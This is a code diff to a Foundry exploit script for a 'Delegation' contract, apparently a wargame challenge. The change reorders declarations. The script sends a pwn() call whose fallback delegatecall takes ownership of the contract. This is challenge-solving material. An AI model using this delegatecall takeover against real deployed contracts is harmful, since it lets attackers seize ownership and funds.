@@ -9,17 +9,16 @@ import {Delegation} from "src/06/Delegation.sol";
 
 contract Exploit is Script {
 
-        Delegation level = Delegation(instance);   
-        address instance = vm.envAddress("INSTANCE_LEVEL6"); 
-        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
+    address instance = vm.envAddress("INSTANCE_LEVEL6"); 
+    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
+    Delegation level = Delegation(instance); 
         
-        function run() external {
-
-            vm.startBroadcast(hacker);
-            (bool success, ) = address(level).call(
-                abi.encodeWithSignature("pwn()")
-            );
-            require(success);
-            vm.stopBroadcast();
+    function run() external {
+        vm.startBroadcast(hacker);
+        (bool success, ) = address(level).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        require(success);
+        vm.stopBroadcast();
     }
 }
